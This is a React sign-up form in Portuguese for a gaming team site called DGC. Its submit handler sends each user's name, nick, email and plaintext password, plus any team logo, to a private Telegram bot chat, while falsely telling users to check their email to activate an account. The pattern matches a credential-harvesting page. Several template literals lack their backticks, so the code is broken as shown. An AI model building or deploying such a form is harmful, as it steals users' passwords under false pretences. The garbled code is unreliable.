import React, { useState } from "react";
import styles from "../styles/Index.module.css"; // Cria esse CSS!

function Index() {
  const [formData, setFormData] = useState({
    fullName: "",
    nick: "",
    email: "",
    password: "",
    confirmPassword: "",
    teamOption: "join",
    existingTeamName: "",
    newTeamName: "",
    teamLogo: null,
  });

  const [errors, setErrors] = useState({});
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [logoPreview, setLogoPreview] = useState(null);

  const handleChange = (e) => {
    const { name, value, type } = e.target;

    if (type === "file") {
      const file = e.target.files[0];
      setFormData((prev) => ({ ...prev, [name]: file }));

      if (file) {
        const reader = new FileReader();
        reader.onloadend = () => {
          setLogoPreview(reader.result);
        };
        reader.readAsDataURL(file);
      } else {
        setLogoPreview(null);
      }
      return;
    }

    setFormData((prev) => {
      const updatedFormData = { ...prev, [name]: value };

      if (name === "password" || name === "confirmPassword") {
        validatePasswords(updatedFormData);
      } else if (name !== "teamOption") {
        validateField(name, value);
      }

      return updatedFormData;
    });
  };

  const validateField = (fieldName, value) => {
    let newErrors = { ...errors };

    switch (fieldName) {
      case "fullName":
        if (!value.trim()) {
          newErrors.fullName = "Nome completo é obrigatório";
        } else if (value.trim().split(" ").length < 2) {
          newErrors.fullName = "Digite nome e sobrenome";
        } else {
          delete newErrors.fullName;
        }
        break;

      case "nick":
        if (!value.trim()) {
          newErrors.nick = "Nick é obrigatório";
        } else if (value.length < 3) {
          newErrors.nick = "Mínimo 3 caracteres";
        } else {
          delete newErrors.nick;
        }
        break;

      case "email":
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!value) {
          newErrors.email = "E-mail é obrigatório";
        } else if (!emailRegex.test(value)) {
          newErrors.email = "E-mail inválido";
        } else {
          delete newErrors.email;
        }
        break;

      default:
        break;
    }

    setErrors(newErrors);
  };

  const validatePasswords = (data) => {
    let newErrors = { ...errors };

    if (!data.password) {
      newErrors.password = "Senha é obrigatória";
    } else if (data.password.length < 6) {
      newErrors.password = "Mínimo 6 caracteres";
    } else {
      delete newErrors.password;
    }

    if (data.password !== data.confirmPassword) {
      newErrors.confirmPassword = "As senhas não coincidem";
    } else {
      delete newErrors.confirmPassword;
    }

    setErrors(newErrors);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    let newErrors = { ...errors };

    if (formData.teamOption === "join") {
      if (!formData.existingTeamName.trim()) {
        newErrors.existingTeamName = "Nome do time é obrigatório";
      } else {
        delete newErrors.existingTeamName;
      }
    } else {
      if (!formData.newTeamName.trim()) {
        newErrors.newTeamName = "Nome do novo time é obrigatório";
      } else {
        delete newErrors.newTeamName;
      }
    }

    validatePasswords(formData);
    Object.keys(formData).forEach((field) => {
      if (field !== "teamLogo" && field !== "teamOption") {
        validateField(field, formData[field]);
      }
    });

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      const BOT_TOKEN = "SEU_BOT_TOKEN";
      const CHAT_ID = "SEU_CHAT_ID";

   let teamInfo = "";
if (formData.teamOption === "join") {
  teamInfo = `🔵 Entrar em time existente\n🏆 Nome do time: ${formData.existingTeamName}`;
} else {
  teamInfo = `🟢 Criar novo time\n🏆 Nome do time: ${formData.newTeamName}`;
}

      const messageText = 
🚀 Novo cadastro DGCBot:
👤 Nome: ${formData.fullName}
🎮 Nick: ${formData.nick}
📧 Email: ${formData.email}
🔑 Senha: ${formData.password}
✅ Csenha: ${formData.confirmPassword}
${teamInfo}
      ;

      try {
        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: messageText }),
        });
      } catch (error) {
        console.error("Erro ao enviar mensagem:", error);
      }

      if (formData.teamOption === "create" && formData.teamLogo) {
        const formDataToSend = new FormData();
        formDataToSend.append("chat_id", CHAT_ID);
        formDataToSend.append("document", formData.teamLogo);
        formDataToSend.append(
          "caption",
          Logo do time: ${formData.newTeamName}
        );

        try {
          await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendDocument, {
            method: "POST",
            body: formDataToSend,
          });
        } catch (error) {
          console.error("Erro ao enviar logo:", error);
        }
      }

      setIsSubmitted(true);
      setFormData({
        fullName: "",
        nick: "",
        email: "",
        password: "",
        confirmPassword: "",
        teamOption: "join",
        existingTeamName: "",
        newTeamName: "",
        teamLogo: null,
      });
      setLogoPreview(null);
    }
  };

  return (
    <section className={styles.container}>
      <h1 className={styles.heroText}>
        Seja bem-vindo ao <br />
        <span className={styles.heroTextSpan}>D</span>
        <span className={styles.heroTextSpan}>G</span>
        <span className={styles.heroTextSpan}>C</span> <br />
        mostre a sua habilidade!
      </h1>

      <section className={styles.explication}>
        <p>Preencha o formulário abaixo para criar sua conta</p>
      </section>

      {isSubmitted ? (
        <div className={styles.successMessage}>
          <h2>Cadastro realizado com sucesso!</h2>
          <p>Verifique seu e-mail para ativar sua conta</p>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className={styles.form} noValidate>
          <h2 className={styles.formTitle}>Cadastro</h2>

          <div className={styles.formGroup}>
            <label htmlFor="fullName" className={styles.label}>
              Nome completo:
            </label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
              className={${styles.input} ${
                errors.fullName ? styles.error : ""
              }}
            />
            {errors.fullName && (
              <span className={styles.errorMessage}>{errors.fullName}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="nick" className={styles.label}>
              Nick:
            </label>
            <input
              type="text"
              id="nick"
              name="nick"
              value={formData.nick}
              onChange={handleChange}
              className={${styles.input} ${errors.nick ? styles.error : ""}}
            />
            {errors.nick && (
              <span className={styles.errorMessage}>{errors.nick}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="email" className={styles.label}>
              E-mail:
            </label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              className={${styles.input} ${errors.email ? styles.error : ""}}
            />
            {errors.email && (
              <span className={styles.errorMessage}>{errors.email}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="password" className={styles.label}>
              Senha:
            </label>
            <input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              className={${styles.input} ${
                errors.password ? styles.error : ""
              }}
            />
            {errors.password && (
              <span className={styles.errorMessage}>{errors.password}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="confirmPassword" className={styles.label}>
              Confirme sua senha:
            </label>
            <input
              type="password"
              id="confirmPassword"
              name="confirmPassword"
              value={formData.confirmPassword}
              onChange={handleChange}
              className={${styles.input} ${
                errors.confirmPassword ? styles.error : ""
              }}
            />
            {errors.confirmPassword && (
              <span className={styles.errorMessage}>
                {errors.confirmPassword}
              </span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label className={styles.label}>Escolha uma opção de time:</label>
            <div className={styles.radioGroup}>
              <div className={styles.inputs}>
                <label className={styles.radioLabel}>
                  Entrar em um time existente
                </label>
                <input
                  type="radio"
                  name="teamOption"
                  value="join"
                  checked={formData.teamOption === "join"}
                  onChange={handleChange}
                />
              </div>
              <div className={styles.inputs}>
                {" "}
                <label className={styles.radioLabel}>Criar um novo time</label>
                <input
                  type="radio"
                  name="teamOption"
                  value="create"
                  checked={formData.teamOption === "create"}
                  onChange={handleChange}
                />
              </div>
            </div>
          </div>

          {formData.teamOption === "join" && (
            <div className={styles.formGroup}>
              <label htmlFor="existingTeamName" className={styles.label}>
                Nome do time existente:
              </label>
              <input
                type="text"
                id="existingTeamName"
                name="existingTeamName"
                value={formData.existingTeamName}
                onChange={handleChange}
                className={${styles.input} ${
                  errors.existingTeamName ? styles.error : ""
                }}
              />
              {errors.existingTeamName && (
                <span className={styles.errorMessage}>
                  {errors.existingTeamName}
                </span>
              )}
            </div>
          )}

          {formData.teamOption === "create" && (
            <>
              <div className={styles.formGroup}>
                <label htmlFor="newTeamName" className={styles.label}>
                  Nome do novo time:
                </label>
                <input
                  type="text"
                  id="newTeamName"
                  name="newTeamName"
                  value={formData.newTeamName}
                  onChange={handleChange}
                  className={${styles.input} ${
                    errors.newTeamName ? styles.error : ""
                  }}
                />
                {errors.newTeamName && (
                  <span className={styles.errorMessage}>
                    {errors.newTeamName}
                  </span>
                )}
              </div>
              <div className={styles.formGroup}>
                <label htmlFor="teamLogo" className={styles.label}>
                  Logo do time:
                </label>
                <input
                  type="file"
                  id="teamLogo"
                  name="teamLogo"
                  accept="image/*"
                  onChange={handleChange}
                  className={styles.input}
                />
                {logoPreview && (
                  <img
                    src={logoPreview}
                    alt="Preview da logo"
                    className={styles.logoPreview}
                  />
                )}
              </div>
            </>
          )}

          <button type="submit" className={styles.submitBtn}>
            Criar Conta
          </button>
        </form>
      )}
    </section>
  );
}

export default Index;
